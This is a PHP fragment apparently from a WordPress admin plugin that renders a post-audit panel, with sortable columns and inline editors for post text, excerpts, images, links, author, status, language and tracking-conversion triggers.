					$postsQuery = get_posts(array('orderby' => 'title', 'order' => 'ASC', 'numberposts' => -1,'post_status'=>array( 'publish','future','private','draft'),'post_type'=> array( $post_type )));
					
					if( $s_value ) usort($postsQuery, "hc2_sort_posts");
					
					foreach($postsQuery as $post){
						echo '<tr class="hc2_audit_panel hc2_audit_panel_container hc2_pushed_'.$remotedata[$post->ID].'" data-status="'.$post->post_status.'" data-url="'.str_replace(hc2_sanitize_url(get_site_url()),hc2_sanitize_url(get_option('hc2_production_url')),get_permalink($post)).'" >';
						hc2_audit_panel($post);
						echo '</tr>'; 
					}
				?>
			</table>
		<?php
	}
	
	function hc2_sort_posts($a, $b)
	{
		$thumba = get_post_meta($a->ID,'hc2_custom_thumb',1);
		if( !$thumba ) $thumba = get_the_post_thumbnail_url($a);
		$thumbb = get_post_meta($b->ID,'hc2_custom_thumb',1);
		if( !$thumbb ) $thumbb = get_the_post_thumbnail_url($b);
		if( $_POST['value'] == 'status' ) $result = strcmp( hc2_stagingstatus( $a,1 ), hc2_stagingstatus( $b,1 ) );
		if( $_POST['value'] == 'title' ) $result = strcmp( $a->post_title, $b->post_title );
		if( $_POST['value'] == 'seotitle' ) $result = strcmp( get_post_meta($a->ID,'hc2_custom_title',1),get_post_meta($b->ID,'hc2_custom_title',1) );
		if( $_POST['value'] == 'thumb' ) $result = strcmp( $thumba,$thumbb );
		if( $_POST['value'] == 'slug' ) $result = strcmp( $a->post_name, $b->post_name );
		if( $_POST['value'] == 'render' ) $result = strcmp( get_post_meta($a->ID,'hc2_post_mode',1),get_post_meta($b->ID,'hc2_post_mode',1) );
		if( $_POST['value'] == 'rendered' )$result = strcmp( get_option('hc2_renderlist')[$a->ID],get_option('hc2_renderlist')[$b->ID] );
		if( $_POST['value'] == 'author' ) $result = strcmp( $a->post_author, $b->post_author );
		if( $_POST['value'] == 'status' ) $result = strcmp( $a->post_status, $b->post_status );
		
		if( $_POST['value'] == 'hide' ) $result = strcmp( (get_post_meta($a->ID,'hcube_sitemap_hide',1)?'1':'2'),(get_post_meta($b->ID,'hcube_sitemap_hide',1)?'1':'2') );
		if( $_POST['value'] == 'about' ) $result = strcmp( (get_post_meta($a->ID,'hcube_is_about',1)?'1':'2'),(get_post_meta($b->ID,'hcube_is_about',1)?'1':'2') );
		if( $_POST['value'] == 'service' ) $result = strcmp( (get_post_meta($a->ID,'hcube_is_service',1)?'1':'2'),(get_post_meta($b->ID,'hcube_is_service',1)?'1':'2') );
		if( $_POST['value'] == 'google' ) $result = strcmp( (!get_post_meta($a->ID,'hcube_cm_notracking',1)?'1':'2'),(!get_post_meta($b->ID,'hcube_cm_notracking ',1)?'1':'2') );
		if( $_POST['value'] == 'seourgent' ) $result = strcmp( (get_post_meta($a->ID,'hc2_keys_urgent',1)?'1':'2'),(get_post_meta($b->ID,'hc2_keys_urgent ',1)?'1':'2') );
		
		if( $_POST['value'] == 'notes' ) $result = strcmp( get_post_meta($a->ID,'hc2_notes',1),get_post_meta($b->ID,'hc2_notes',1) );
		if( $_POST['value'] == 'keywords' ) $result = strcmp( get_post_meta($a->ID,'hc2_keys',1),get_post_meta($b->ID,'hc2_keys',1) );
		
		if( $_POST['value'] == 'seoscore' ){
			$lena = get_post_meta($a->ID,'hc2_seoscore',1);
			$lenb = get_post_meta($b->ID,'hc2_seoscore',1);
			if ($lena == $lenb) $result = 0;
			$result = ($lena < $lenb) ? -1 : 1;
		}
		
		if( $_POST['value'] == 'excerpt' ){
			$lena = strlen(get_the_excerpt($a));
			$lenb = strlen(get_the_excerpt($b));
			if ($lena == $lenb) $result = 0;
			$result = ($lena < $lenb) ? -1 : 1;
		}
		if( $_POST['dir'] == 1 ) return $result * -1;
		return $result;
	}
		
	function hc2_audit_panel($post){
		
        ?>
			<td class='hc2_audit_panel_seemore'>
				<div class='hc2_audit_panel_arrow'></div>
				<div class='hc2_audit_panel_morebox'>
					<div class='hc2_audit_panel_morebox_links'>
						<a href='<?php echo get_edit_post_link($post); ?>'>Edit</a>
						<?php if($post->post_type!='wp_block'){ ?><a target="_blank" href='<?php echo get_permalink($post); ?>'>View</a><?php } ?>
						<?php if($post->post_type=='post'||$post->post_type=='page'){ ?><a target="_blank" href='<?php echo str_replace(hc2_sanitize_url(get_site_url()),hc2_sanitize_url(get_option('hc2_production_url')),get_permalink($post)); ?>'>View on Production</a><?php } ?>
					</div>
					<div class='hc2_audit_panel_morebox_info'>
						<div class='hc2_audit_panel_morebox_info_inner'>
							<div><span class='hc2_auditinfo_name'>ID</span><span class='hc2_auditinfo_value'>#<?php echo $post->ID; ?></span></div>
							<div><span class='hc2_auditinfo_name'>Last Modified</span><span class='hc2_auditinfo_value'><?php echo get_the_modified_date('M d, Y',$post->ID); ?></span></div>
							<button data-id='<?php echo $post->ID; ?>' data-type='<?php echo get_post_type($post->ID); ?>' onclick='hc2_duppost(this)' class='hc2_popbutton hc2_dupbutton'>Duplicate</button>
							<button data-id='<?php echo $post->ID; ?>' data-type='<?php echo get_post_type($post->ID); ?>' onclick='hc2_deletepost(this)' class='hc2_popbutton hc2_deletebutton'>Delete</button>
						</div>
					</div>
					<?php if($post->post_type=='post'||$post->post_type=='page'){ ?>
						<div class='hc2_audit_panel_morebox_edit_col1'>
							<?php
								$altpage = '';
								$languages = get_hc2('settings','languages');
								if(count($languages)>1 && get_post_meta( $post->ID, 'hc2_lang', 1 )){ 
									foreach($languages as $lang)
										if(strtolower($lang) != get_post_meta( $post->ID, 'hc2_lang', 1 ))$altpage = get_post_meta($post->ID,'hcube_eq_page_'.strtolower($lang),1);
									?> 
										<div class='hc2_audit_panel_languageurl'><input onchange="hc2_audit_newchange(this)" type='text' class='hc2_field_language_url' value='<?php echo esc_attr($altpage); ?>'/></div>
									<?php 
								} 
							?>
						</div>
					<?php } ?>
					<?php if($post->post_type!='wp_block'){ ?>
						<div class='hc2_audit_panel_morebox_edit_col2'>
							<div class='hc2_audit_panel_publisheddate'><input onchange="hc2_audit_newchange(this)" class='hc2_field_date' type='datetime-local' value='<?php echo esc_attr(explode('+',get_the_date('c',$post))[0]); ?>'/></div>
						</div>
					<?php } ?>
				</div>
			</td>

			

					<?php 
						$orig_order = $order = "2-3-4-5-6-7-8-9-10-11-12-13-14-15-16-17-18-19-20-21-22-23-24-25-26";
						if( isset( $_GET['order'] ) ) $order = $_GET['order'];
						if( isset( $_POST['order'] ) ) $order = $_POST['order'];

						$done = [];
						$ord = array_unique( explode( '-', $order ) );
						foreach( $ord as $o ){
							array_push( $done, $o );
							hc2_audit_row($o,$post);
						}
						if( count( $done ) ){
							echo '<td class="hc2divid"></td>';
							$ord = array_unique( explode( '-', $orig_order ) );
							foreach( $ord as $o ){
								if( !in_array( $o, $done ) )
									hc2_audit_row($o,$post);
							}
						}
					?>
			
		<?php
		
	}
	
	function hc2_audit_address($post){
		$places = get_hc2('places');
		echo '<select onchange="hc2_audit_newchange(this)" class="hc2_field_address '.(count($places)<2?'hc2_disabled':'').'">';
		foreach( $places as $name => $place )echo '<option value="'.$name.'" '.(get_post_meta($post->ID,'hc2_address',true)==$name?'selected':'').'>' . $name . '</option>';
		echo '</select>';
	}
	
	function hc2_audit_language($post){
		$languages = get_hc2('settings','languages');
		echo '<select onchange="hc2_audit_newchange(this)" class="hc2_field_parent '.(count($languages)<2?'hc2_disabled':'').'">';	
		echo '<option value="none"></option>';
		foreach( $languages as $lang )echo '<option value="' . strtolower($lang) . '" '.(get_post_meta( $post->ID, 'hc2_lang', 1 )==strtolower($lang)?'selected':'').'>' . $lang . '</option>';
		echo '</select>';
	}
	
	function hc2_is_amp_invalid($post){
		$validid = get_post_meta($post->ID,'_amp_validated_url_post_id',1);
		if($validid){
			$postb = get_post($validid);
			if(is_object($postb)){
				$errors = json_decode($postb->post_content,1);
				if($errors)return count($errors);
				return false;
			}
			return false;
		}
		return false;
	}
	
	
	function hc2_audit_author($post){
		$blogusers = get_users( [ 'role__in' => [ 'administrator', 'editor', 'author' ] ] );
		echo '<select onchange="hc2_audit_newchange(this)" class="hc2_field_author '.(count($blogusers)<2?'hc2_disabled':'').'">';
		foreach ( $blogusers as $user ) {
			echo '<option value="'.$user->ID.'" '.($post->post_author==$user->ID?'selected':'').'>' . esc_html( $user->display_name ) . '</option>';
		}
		echo '</select>';
	}
	
	function hc2_audit_status($post){
		echo '<select onchange="hc2_audit_newchange(this);hc2_changestatus(this)" class="hc2_field_status">';
			echo '<option value="publish" '.($post->post_status=='publish'?'selected':'').'>Published</option>';
			echo '<option value="draft" '.($post->post_status=='draft'?'selected':'').'>Draft</option>';
			echo '<option value="future" '.($post->post_status=='future'?'selected':'').'>Scheduled</option>';
			echo '<option value="pending" '.($post->post_status=='pending'?'selected':'').'>Pending Approval</option>';
			echo '<option value="private" '.($post->post_status=='private'?'selected':'').'>Private</option>';
		echo '</select>';
	}
	
	function hc2_audit_render($post){
		?>
			<select class='hc2_field_render' onchange="hc2_audit_newchange(this)" >
				<option value='fasthtml' <?php if( get_post_meta( $post->ID , 'hc2_post_mode', true ) != 'php' && get_post_meta( $post->ID , 'hc2_post_mode', true ) != 'html' && get_post_meta( $post->ID , 'hc2_post_mode', true ) != 'wordpress' )echo 'selected'; ?>>Fast HTML</option>
				<option value='html' <?php if( get_post_meta( $post->ID , 'hc2_post_mode', true ) == 'html' )echo 'selected'; ?>>HTML</option>
				<option value='wordpress' <?php if( get_post_meta( $post->ID , 'hc2_post_mode', true ) == 'wordpress' )echo 'selected'; ?>>Wordpress</option>
				<option value='php' <?php if( get_post_meta( $post->ID , 'hc2_post_mode', true ) == 'php' )echo 'selected'; ?>>PHP</option>
			</select>
		<?php
	}
	
	function hc2_sort_audit_text($a,$b){
		return ($a['pos'] < $b['pos']) ? -1 : 1;
	}
	function hc2_audit_text($post){
		?> 
			<div class='hc2_exittoggle' onclick='hc2_toggleme(this)'></div>
			<div class='hc2_audit_panel_list_inner'> 
		<?php
			$total = 0;
			$tags = ['h1','h2','h3','h4','h5','h6','p','li','cite','pre'];
			$items = [];
			foreach( $tags as $tag ){
				$tagms = [$tag.' ',$tag.'>'];
				$tm = 1;
				foreach( $tagms as $tagm ){
					$item = [];
					$parts = explode('<'.$tagm,$post->post_content);
					$pos = strlen($parts[0]);
					array_shift($parts);
					$id = 0;
					foreach( $parts as $str ){
						$item['tm'] = $tm;
						$item['str'] = $str;
						$item['pos'] = $pos;
						$item['tag'] = $tag;
						$item['tagm'] = $tagm;
						$item['id'] = $id;
						array_push($items,$item);
						$pos += strlen($str);
						$id ++;
					}
					$total += count( $parts );
					$tm = 0;
				}
			}
			usort($items,'hc2_sort_audit_text');
			if( count( $items )){
				foreach( $items as $item ){
					if( strpos( $item['str'], 'blocks-gallery-item' ) === false ){
						$start = $item['str'];
						if( $item['tm'] ) $start = explode('>',$item['str'],2)[1];
						?>
							
							<select data-id="<?php echo $item['tag'].'-'.$item['tagm'].'-'.$item['id']; ?>" class='hc2_audit_panel_text_type_select hc2_audit_panel_text_type hc2_audit_panel_text_type_<?php echo $item['tag']; ?>'>
							<?php if( true /* !in_array( $item['tag'], ['h1','h2','h3','h4','h5','h6'] ) */ ) { ?>
								<option value='<?php echo $item['tag']; ?>' selected ><?php echo $item['tag']; ?></option>
							<?php }else{ ?>
								<option value='h1' <?php echo $item['tag']=='h1'?'selected':''; ?> >H1</option>
								<option value='h2' <?php echo $item['tag']=='h2'?'selected':''; ?> >H2</option>
								<option value='h3' <?php echo $item['tag']=='h3'?'selected':''; ?> >H3</option>
								<option value='h4' <?php echo $item['tag']=='h4'?'selected':''; ?> >H4</option>
								<option value='h5' <?php echo $item['tag']=='h5'?'selected':''; ?> >H5</option>
								<option value='h6' <?php echo $item['tag']=='h6'?'selected':''; ?> >H6</option>
							<?php } ?>
							</select>

							<div class='hc2_audit_text_item hc2_audit_text_item_<?php echo $item['tag']; ?>'>
								<textarea placeholder="Begin typing..." data-id="<?php echo $item['tag'].'-'.$item['tagm'].'-'.$item['id']; ?>" onkeyup="hc2_editme(this)" onchange="hc2_audit_newchange(this)" class='hc2_field_text'><?php echo esc_attr(explode('</'.$item['tag'].'>',$start)[0]); ?></textarea>
							</div>
						<?php
					}
				}
			}
		?> 
			</div> 
			<span class='<?php if(!$total)echo 'hc2_disabled'; ?>' onclick='hc2_toggleme(this)'>
				<?php echo $total; ?>
			</span>
		<?php
	}

	function hc2_audit_excerpt($post){
		?> 
			<div class='hc2_exittoggle' onclick='hc2_toggleme(this)'></div>
			<div class='hc2_audit_panel_list_inner'> 
				<div class='hc2_audit_text_item'>
					<textarea placeholder="Begin typing..." onkeyup="hc2_editme(this)" onchange="hc2_audit_newchange(this)" class='hc2_field_excerpt'><?php echo esc_textarea(get_the_excerpt($post)); ?></textarea>
				</div>
			</div> 
			<span onclick='hc2_toggleme(this)'>
				<?php echo strlen(get_the_excerpt($post)); ?>
			</span>
		<?php
	}
	
	function hc2_audit_img($post){
		$items = explode('<img',$post->post_content);
		array_shift($items);
		$itemsb = explode('url(',$post->post_content);
		array_shift($itemsb);
		?>
			<div class='hc2_exittoggle' onclick='hc2_toggleme(this)'></div>
			<span class='<?php if(!count($items) && !count($itemsb))echo 'hc2_disabled'; ?>' onclick='hc2_toggleme(this)'>
				<?php echo count($items)+count($itemsb); ?>
			</span>
			<div class='hc2_audit_panel_list_inner'>
				<?php 
					$i = 0;
					foreach( $items as $str ){ 
						?>
							<div class='hc2_audit_conversions_item' data-item="src_<?php echo $i; ?>">
								<div class="hc2_inlineimg" onclick='hc2_changeimg(this)' data-id="<?php echo $post->ID; ?>" data-item="src_<?php echo $i; ?>" style="background-image:url(<?php echo explode('"',explode('src="',$str)[1])[0]; ?>)"></div>
								<input class="hc2_altfield" onkeyup="hc2_audit_newchange(this)" value="<?php echo esc_attr(explode('"',explode('alt="',$str)[1])[0]); ?>" />
							</div>
						<?php 
						$i++;
					}
				?>
				<?php 
					$i = 0;
					foreach( $itemsb as $str ){ 
						?>
							<div class='hc2_audit_conversions_item' data-item="src_<?php echo $i; ?>">
								<div class="hc2_bgimg" onclick='hc2_changeimg(this)' data-id="<?php echo $post->ID; ?>" data-item="url_<?php echo $i; ?>" style="background-image:url(<?php echo explode(')',$str)[0]; ?>)"></div>
							</div>
						<?php 
						$i++;
					}
				?>
			</div>
		<?php
	}
	
	function hc2_audit_links($post){

		?>
			<div class='hc2_exittoggle' onclick='hc2_toggleme(this)'></div>
			<div class='hc2_audit_panel_list_inner'>
		<?php

		$occurence = 0;
		$thesecount = 0;
		$count = 0;
		?> <span class='hc2_links_section hc2_links_section_buttons post_<?php echo $post->ID; ?>'>Buttons</span> <?php
		$strings = explode('wp-block-button',$post->post_content);
		array_shift($strings);
		foreach( $strings as $str ){
			$occurence++;
			if( strpos( explode('</div>',$str)[0], 'href=' ) !== false ){
				$link = explode( '"', explode( 'href="', $str,2 )[1],2)[0];
				$text = explode( '</a>', explode( '>', $str,2 )[1],2)[0];
				?>
					<div class='hc2_link_item hc2_link_item_button'>
						<input data-occ="<?php echo $occurence; ?>" onchange="hc2_audit_newchange(this);" class='hc2_button_link' value='<?php echo $link; ?>'/>
						<a class='hc2_visit_link' target='_blank' href='<?php echo $link; ?>'>Open</a>
						<input data-occ="<?php echo $occurence; ?>" onchange="hc2_audit_newchange(this);" class='hc2_button_text' value='<?php echo $text; ?>'/>
					</div>
				<?php
				$count++;
				$thesecount++;
			}
		}
		if( !$thesecount ) echo '<style>.hc2_links_section_buttons.post_'.$post->ID.'{display:none !important;}</style>';
				
		$occurence = 0;
		$thesecount = 0;
		?> <span class='hc2_links_section hc2_links_section_groups post_<?php echo $post->ID; ?>'>Clickable Groups</span> <?php
		$strings = explode('wp-block-group ',$post->post_content);
		array_shift($strings);
		foreach( $strings as $str ){
			$occurence++;
			if( strpos( explode('>',$str)[0], 'href=' ) !== false ){
				$link = explode( '"', explode( 'href="', $str,2 )[1],2)[0];
				$text = substr(strip_tags('<div><div>'.explode( '>',explode( '>', $str, 2 )[1], 2)[1]),0,40).'...';
				?>
					<div class='hc2_link_item hc2_link_item_group'>
						<input data-occ="<?php echo $occurence; ?>" onchange="hc2_audit_newchange(this);" class='hc2_group_link hc2_group_link_space' value='<?php echo $link; ?>'/>
						<a class='hc2_visit_link' target='_blank' href='<?php echo $link; ?>'>Open</a>
						<span class='hc2_group_span' ><?php echo $text; ?></span>
					</div>
				<?php
				$count++;
				$thesecount++;
			}
		}
		$occurence = 0;
		$strings = explode('"wp-block-group"',$post->post_content);
		array_shift($strings);
		foreach( $strings as $str ){
			$occurence++;
			if( strpos( explode('>',$str)[0], 'href=' ) !== false ){
				$link = explode( '"', explode( 'href="', $str,2 )[1],2)[0];
				$text = substr(strip_tags('<div><div>'.explode( '>',explode( '>', $str, 2 )[1], 2)[1]),0,40).'...';
				?>
					<div class='hc2_link_item hc2_link_item_group'>
						<input data-occ="<?php echo $occurence; ?>" onchange="hc2_audit_newchange(this);" class='hc2_group_link hc2_group_link_quote' value='<?php echo $link; ?>'/>
						<a class='hc2_visit_link' target='_blank' href='<?php echo $link; ?>'>Open</a>
						<span class='hc2_group_span' ><?php echo $text; ?></span>
					</div>
				<?php
				$count++;
				$thesecount++;
			}
		}
		if( !$thesecount ) echo '<style>.hc2_links_section_groups.post_'.$post->ID.'{display:none !important;}</style>';
				
		$occurence = 0;
		$thesecount = 0;
		?> <span class='hc2_links_section hc2_links_section_images post_<?php echo $post->ID; ?>'>Clickable Images</span> <?php
		$strings = explode('wp-block-image',$post->post_content);
		array_shift($strings);
		foreach( $strings as $str ){
			$occurence++;
			if( strpos( explode('</figure>',$str)[0], 'href=' ) !== false ){
				$link = explode( '"', explode( 'href="', $str,2 )[1],2)[0];
				$img = explode( '"', explode( 'src="', $str,2 )[1],2)[0];
				?>
					<div class='hc2_link_item hc2_link_item_image'>
						<div class='hc2_image_img' style='background-image:url(<?php echo $img; ?>)'></div>
						<input data-occ="<?php echo $occurence; ?>" onchange="hc2_audit_newchange(this);" class='hc2_image_link' value='<?php echo $link; ?>'/>
						<a class='hc2_visit_link' target='_blank' href='<?php echo $link; ?>'>Open</a>
					</div>
				<?php
				$count++;
				$thesecount++;
			}
		}
		if( !$thesecount ) echo '<style>.hc2_links_section_images.post_'.$post->ID.'{display:none !important;}</style>';

		$thesecount = 0;
		?> <span class='hc2_links_section hc2_links_section_links post_<?php echo $post->ID; ?>'>Inline Links</span> <?php
		$tags = ['h1','h2','h3','h4','h5','h6','p','li','cite','pre'];
		foreach( $tags as $tag ){
			$strings = explode('<'.$tag.' ',$post->post_content);
			array_shift($strings);
			foreach( $strings as $str ){
				if(strpos($str,'href')!==false){
					$hrefs = explode('href="', explode( '</'.$tag.'>', $str )[0]);
					array_shift($hrefs);
					foreach( $hrefs as $href ){
						$link = explode('"',$href)[0];
						$text = explode('</a>',explode('>',$href,2)[1])[0];
						?>
							<div class='hc2_link_item hc2_link_item_inline'>
								<span class='hc2_inline_span' ><?php echo $link; ?></span>
								<span class='hc2_inline_span' ><?php echo $text; ?></span>
								<a class='hc2_visit_link' target='_blank' href='<?php echo $link; ?>'>Open</a>
							</div>
						<?php
						$count++;
						$thesecount++;
					}
				}
			}
			$strings = explode('<'.$tag.'>',$post->post_content);
			array_shift($strings);
			foreach( $strings as $str ){
				if(strpos($str,'href')!==false){
					$hrefs = explode('href="', explode( '</'.$tag.'>', $str )[0]);
					array_shift($hrefs);
					foreach( $hrefs as $href ){
						$link = explode('"',$href)[0];
						$text = explode('</a>',explode('>',$href,2)[1])[0];
						?>
							<div class='hc2_link_item hc2_link_item_inline'>
								<span class='hc2_inline_span' ><?php echo $link; ?></span>
								<span class='hc2_inline_span' ><?php echo $text; ?></span>
								<a class='hc2_visit_link' target='_blank' href='<?php echo $link; ?>'>Open</a>
							</div>
						<?php
						$count++;
						$thesecount++;
					}
				}
			}
		}
		if( !$thesecount ) echo '<style>.hc2_links_section_links.post_'.$post->ID.'{display:none !important;}</style>';
				
		?>
			</div>
			<span class='<?php if(!$count)echo 'hc2_disabled'; ?>' onclick='hc2_toggleme(this)'>
				<?php echo $count; ?>
			</span>
		<?php

	}
	
	function hc2_audit_google_conversions($post){
		$items = ['a','b'];
		$checked = 0;
		foreach( $items as $key ){ 
			if(get_post_meta( $post->ID, 'hcube_conversion_trigger_'.$key, true))
				$checked++;
		} 
		?>
		
			<div class='hc2_exittoggle' onclick='hc2_toggleme(this)'></div>
			<span data-content='<?php echo $checked; ?>' class='<?php if(!count($items))echo 'hc2_disabled'; ?>' onclick='hc2_toggleme(this)'>
				<?php echo $checked; ?>
			</span>
			<div class='hc2_audit_panel_list_inner hc2_field_conversion_triggers'>
				<?php 
					foreach( $items as $key ){ 
						?>
							<div class='hc2_audit_conversions_item'>
								<span><?php echo $key; ?></span>
								<div><input class='hc2_trigger' onchange="hc2_audit_newchange(this);hc2_audit_convchange(this);" type='checkbox' <?php echo get_post_meta( $post->ID, 'hcube_conversion_trigger_'.$key, true)?'checked':''; ?> /><label>Conversion Trigger <?php echo strtoupper($key); ?></label></div>
							</div>
						<?php 
					} 
				?>
			</div>
		<?php
	}
	
	function hc2_audit_pixel_conversions($post){
		$items = ['a','b','c','d','e'];
		$checked = 0;
		foreach( $items as $key ){ 
			if(get_post_meta( $post->ID, 'hcube_pixel_trigger_'.$key, true))
				$checked++;
		} 
		?>
			<div class='hc2_exittoggle' onclick='hc2_toggleme(this)'></div>
			<span data-content='<?php echo $checked; ?>' class='<?php if(!count($items))echo 'hc2_disabled'; ?>' onclick='hc2_toggleme(this)'>
				<?php echo $checked; ?>
			</span>
			<div class='hc2_audit_panel_list_inner hc2_field_pixel_triggers'>
				<?php 
					foreach( $items as $key ){ 
						?>
							<div class='hc2_audit_conversions_item'>
								<span><?php echo $key; ?></span>
								<div><input class='hc2_trigger' onchange="hc2_audit_newchange(this);hc2_audit_convchange(this);" type='checkbox' <?php echo get_post_meta( $post->ID, 'hcube_pixel_trigger_'.$key, true)?'checked':''; ?> /><label>Pixel Trigger <?php echo strtoupper($key); ?></label></div>
							</div>
						<?php 
					} 
				?>
			</div>
		<?php
	}
	
	
	
	
	